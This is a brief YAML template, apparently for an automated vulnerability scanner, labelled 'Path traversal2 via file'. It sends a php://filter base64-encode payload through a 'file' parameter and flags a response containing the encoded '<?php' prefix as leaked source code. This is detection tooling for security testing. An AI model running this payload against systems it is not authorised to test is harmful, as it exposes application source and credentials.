id: lfi2-121
name: 'Path traversal2 via file'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via file'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      file:
        - 'php://filter/convert.base64-encode/resource=index'
    matchers:
      - type: word
        part: body
        words:
          - 'PD9waHA'
